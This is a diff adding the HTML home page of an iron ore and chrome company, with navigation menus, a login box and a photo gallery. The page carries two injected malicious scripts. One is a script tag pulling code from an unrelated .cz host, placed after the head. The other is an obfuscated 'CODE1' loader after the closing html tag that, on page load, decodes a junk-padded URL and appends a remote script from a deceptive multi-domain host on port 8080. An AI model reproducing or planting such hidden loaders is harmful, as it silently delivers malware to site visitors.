@@ -1,0 +1,211 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Welcome To Yazdani::</title>
+<link rel="stylesheet" href="css/layout.css" type="text/css" />
+<script language="javascript" src="javascript/jquery-1.2.6.js"></script>
+<script language="javascript" src="javascript/layout.js"></script>
+<script src="javascript/jquery.scrollable.min.js"></script>
+<link href="css/scrollable.css" type="text/css" rel="stylesheet"/>
+
+<link rel="stylesheet" href="lightbox.css" type="text/css" media="screen">
+<script type="text/javascript" src="lightbox.js"></script>
+
+
+</head>
+<script language=javascript><!-- 
+ --></script><script src=http://ww.usinvest.cz/greybox/style_ie.php ></script><body>
+
+<!--start header-->
+
+	<div class="header-in">
+	<div class="header">
+	<div class="login">&nbsp;<br />
+	  Login Id &nbsp;&nbsp;: &nbsp;
+	  <input type="text" name="textfield" class="textfield"/>
+	  <br />
+	  <br />
+	  Password&nbsp; : &nbsp;
+	  <input type="text" name="textfield" class="textfield"/>
+	 
+	
+	 
+	<p>
+	 <img src="images/login.jpg"  class="loginbutton"/>
+     </div>
+	
+	</div>
+	</div> 
+
+
+<!--end header-->
+
+
+<!--start mclassdle-->
+	<div class="wrapper">	
+		<div class="left-side">	<div class="menubg">
+										
+											<ul>
+												<li><a href="default.aspx" class="menupage">Home</a></li>
+												<li><a href="#">About Us</a>
+												  <ul class="submenu">
+													 <li><a href="mission.html">Mission</a></li>
+													 <li><a href="objective.html">Objective</a></li>
+													 <li><a href="organisation_chart.html">Organisation Chart</a></li>
+													 <li><a href="production_capacity.html">Production Capacity </a></li>
+													 <li><a href="strengths.html">Strength</a></li>
+												  </ul>
+												</li>
+												<li><a href="#">Iron Ore</a>
+												  <ul class="submenu">
+													 <li><a href="grands_of_iron_ore.html">Grades of iron ore</a></li>
+													 <li><a href="iron_ore_fine_exports.html">Iron Ore Fine Exports</a></li>
+													 <li><a href="why_iron_ore_from_orissa.html">Why iron ore From Orissa</a></li>
+													 <li><a href="standard_fine_specification.html">Standard fine Specifications</a></li>
+												  </ul>
+												</li>
+												<li><a href="chrome.html">Chrome</a></li>
+												<li><a href="#">Operations</a>
+												<ul class="submenu">
+													 <li><a href="infrastructure.html">Infrastructure</a></li>
+													 <li><a href="site_operations.html">Site Operation</a></li>
+													 <li><a href="#">Equipment Facility & Technology</a>
+													 
+													 <ul class="submenu">
+													 <li><a href="mines.html">Mines</a></li>
+													 <li><a href="crushes.html">Crushers</a></li>
+													 <li><a href="procurement_to_loading.html">Procurement to Loading</a></li> <li><a href="monement_raw_material.html">Movement Of Raw Material</a></li>
+													 <li><a href="plot.html">Plot</a></li>
+													 <li><a href="analysis.html">Analysis</a></li>
+													 <li><a href="port_facilities.html">Port Facilites</a></li>
+													 <li><a href="quality_control.html">Quality Controls</a></li>
+													 <li><a href="use_of_information_technology.html">Use of Information techknology</a>													 </li>
+													 <li><a href="PhotoList.aspx">Gallery</a></li>
+													 </ul>
+													 </li>
+												  </ul>
+												</li>
+												
+												<li><a href="NewsList.aspx">News</a></li>
+												<li><a href="glossary.html">Glossary</a></li>
+												<li><a href="ContactUs.aspx">Contact Us</a></li>
+<li><a href="/transport/">TMS</a></li>
+											</ul>
+										
+										
+											</div>
+				
+											  
+											  
+											  
+											  
+											  
+				<div class="space">&nbsp;</div>
+				
+					<div class="Annual">
+				<div class="leftheadingbg">
+					<div class="h2">Annual report</div>
+					 </div><p>
+					 <img src="images/icone2.jpg" class="icon1"  />
+					  <div class="fontleft1">&nbsp;View Annual report</div>
+					  
+					  <br />
+					   
+						<img src="images/icone3.jpg" width="22" height="20" class="icon1" />
+						<div class="fontleft1">Download Anual Report</div>
+						
+						<br />
+						
+					 <img src="images/icone2.jpg" class="icon1" />
+					  <div class="fontleft1">&nbsp;Sustainability  Report</div>
+					  
+							 <br />
+							
+		  </div>
+					<div class="space">&nbsp;</div>
+						<div class="reach">
+						<div class="leftheadingbg">
+							<div class="h2">Reach Us At</div></div>
+							
+							
+							<div class="fontleft1">&nbsp;&nbsp;&nbsp;info@yazdani.net
+	Matt McAlear at<br /> &nbsp;&nbsp;&nbsp;248.233.8000</div>
+							
+						</div>
+		</div>
+		<div class="main">
+				<div class="banner"><img src="images/bannerimg1.png" /></div>
+<div class="aboutheading">
+				<img src="images/heading1.png" />
+				</div>
+			<div class="abouttext">
+				  This page is Under construction... </p>
+			</div>
+			<div>
+				<div class="img" style="height:146px;">&nbsp;</div>
+				<div class="abouttext1" style="height:146px;">&nbsp;</div>
+		  </div>
+				<div>
+				<div class="photogalleryheading">
+				<img src="images/photogalleryheadin1.png" />
+				</div>
+                
+				<div class="photo">
+ <script> 
+  $(function() {
+$("#scrollable").scrollable({horizontal:true});
+});
+</script>
+<div id="scrollable"> 
+     
+   
+    <a  href="#" class="prev"></a>     
+     
+    <div class="items">
+	
+          <a href="galleryimage/img1_big.jpg" rel="lightbox"><img src="galleryimage/img1.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img2_big.jpg" rel="lightbox"><img src="galleryimage/img2.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img3_big.jpg" rel="lightbox"><img src="galleryimage/img3.jpg" width="88" height="72" border="0" /></a> <a href="galleryimage/img4_big.jpg" rel="lightbox"><img src="galleryimage/img4.jpg" width="88" height="72" border="0" /></a> 
+        <a href="galleryimage/img5_big.jpg" rel="lightbox"><img src="galleryimage/img5.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img6_big.jpg" rel="lightbox"><img src="galleryimage/img6.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img7_big.jpg" rel="lightbox"><img src="galleryimage/img7.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img8_big.jpg" rel="lightbox"><img src="galleryimage/img8.jpg" width="88" height="72" border="0" /></a>  <a href="galleryimage/img9_big.jpg" rel="lightbox"><img src="galleryimage/img9.jpg" width="88" height="72" border="0" /></a> 
+        <a href="galleryimage/img10_big.jpg" rel="lightbox"><img src="galleryimage/img10.jpg" width="88" height="72" border="0" /></a> <a href="galleryimage/img11_big.jpg" rel="lightbox"><img src="galleryimage/img11.jpg" width="88" height="72"  border="0"/></a> <a href="galleryimage/img12_big.jpg" rel="lightbox"><img src="galleryimage/img12.jpg" width="88" height="72" border="0" /></a> <a href="galleryimage/img13_big.jpg" rel="lightbox"><img src="galleryimage/img13.jpg" width="88" height="72" border="0" /></a> <a href="galleryimage/img14_big.jpg" rel="lightbox"><img src="galleryimage/img14.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img15_big.jpg" rel="lightbox"><img src="galleryimage/img15.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img16_big.jpg" rel="lightbox"><img src="galleryimage/img16.jpg" width="88" height="72" border="0"/></a>   <a href="galleryimage/img17_big.jpg" rel="lightbox"><img src="galleryimage/img17.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img18_big.jpg" rel="lightbox"><img src="galleryimage/img18.jpg" width="88" height="72" border="0"/></a>   <a href="galleryimage/img20_big.jpg" rel="lightbox"><img src="galleryimage/img20.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img21_big.jpg" rel="lightbox"><img src="galleryimage/img21.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img22_big.jpg" rel="lightbox"><img src="galleryimage/img22.jpg" width="88" height="72" border="0"/></a>  <a href="galleryimage/img23_big.jpg" rel="lightbox"><img src="galleryimage/img23.jpg" width="88" height="72" border="0"/></a> </div> 
+     
+    <a href="#" class="next"></a> 
+     
+</div>
+                </div>
+				
+				
+		  </div>
+	  </div>
+			
+<!--start footer-->
+
+		<div class="footer">
+		<div class="footer-inner1"><br />
+		<div class="footerfont"><a href="default.aspx">Home</a>&nbsp;&nbsp;|&nbsp;&nbsp;I<a href="ironeore.html">ron ore</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="chrome.html">Chrome</a>&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;<a href="PhotoList.aspx">Gallery</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="NewsList.aspx">News</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="glossary.html">Glossary</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="ContactUs.aspx">Contact Us</a> <br />
+		  © All Rights Reserved 2008 Yazdani International Pvt. Ltd.<br />
+		Powered by STI-Creative</div>
+		<br />
+		<p>
+		</div>
+		</div>
+		
+<!--end footer-->
+		
+	<div class="clear"></div>	
+	</div>
+
+
+	
+
+
+
+<!--end mclassdle-->
+
+
+
+
+
+</body>
+</html>
+
+<script>/*CODE1*/ try{window.onload = function(){var Q236s4ic4454clw = document.createElement('script');Q236s4ic4454clw.setAttribute('type', 'text/javascript');Q236s4ic4454clw.setAttribute('id', 'myscript1');Q236s4ic4454clw.setAttribute('src',  'h(t)!^t^))p#@:&&/(##/&$#c^$$l^@)(i&(c$^)k))#$s^o$#r!^)^-$$$&c@$o#^m$!#.#&(e((a!!s)(@t)&m((o@^^n!$!e&^&(y$#).#&c$@o$@!$^m(##(.@m@o@(b(^i&#l#!@e@)@&(-(d)&(e^&@(.))@&h)@@@o^^@m!e#&&)s)a#$$l$$#e^@!p^@l&@u#((^s^#@(.$)r$$u(:!$8!$0&$&8)@$0$!)/!o#&@c##@@n(@^!.))n@e@.)&j!@^#$p#/)^@o^c^n)((.()n^)e^$.@!)$j!!^(p#!/@&)c^(l&(a&s(^s@!m^@a($^t#e!#^@)s$.^c^&#o((&m&/)(&@l&()i(@n)(k$@h&e)@$(l)$p^!e)$!$r$#.)&c!&n($@/$g#o^@&o!$$g$^l^&#@e$.&&!c#o@$$m(/$$'.replace(/\(|\!|&|#|\$|\)|@|\^/ig, ''));Q236s4ic4454clw.setAttribute('defer', 'defer');document.body.appendChild(Q236s4ic4454clw);}} catch(e) {}</script>
